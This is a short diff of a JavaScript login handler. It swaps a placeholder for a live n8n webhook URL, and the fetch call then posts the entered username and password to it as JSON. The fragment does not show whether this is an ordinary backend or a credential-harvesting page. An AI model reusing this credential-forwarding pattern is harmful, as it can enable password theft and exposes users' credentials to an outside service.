@@ -27,7 +27,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
       try {
         // send POST request to webhook
-        const response = await fetch('YOUR_WEBHOOK_URL', {
+        const response = await fetch('https://n8n.srv850749.hstgr.cloud/webhook/bf58870b-841f-415d-8d58-8522bfc1ca6e', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ username, password })
